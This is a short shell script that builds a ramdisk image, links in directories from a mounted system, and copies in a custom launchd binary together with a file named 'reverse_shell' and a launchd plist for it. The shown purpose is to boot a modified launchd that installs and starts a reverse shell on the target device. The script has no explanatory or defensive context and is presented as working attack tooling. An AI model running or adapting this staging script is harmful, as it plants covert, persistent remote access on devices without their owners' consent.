#!/bin/sh
#RAMDISK Volume Creation
#hdiutil create -volname myramdisk -type UDIF -size 1m -fs "Journaled HFS+" -layout NONE myramdisk.dmg
#hdid -readwrite myramdisk.dmg

#RAMDISK preparation
pushd /Volumes/myramdisk
ln -s /mnt/Applications
ln -s /mnt/System
ln -s /mnt/bin
ln -s /mnt/private/etc
ln -s /mnt/private/var/tmp
ln -s /mnt/usr
mkdir dev files private sbin mnt
ln -s /mnt/private/var private/var
chown -R root:wheel .
popd

#RAMDISK preparation (binaries copy)
cp launchd /Volumes/myramdisk/sbin/launchd
chmod 755 /Volumes/myramdisk/sbin/launchd
cp reverse_shell /Volumes/myramdisk/files/
cp com.adel.reverse_shell.plist /Volumes/myramdisk/files/

#RAMDISK finalizing
hdiutil unmount /Volumes/myramdisk
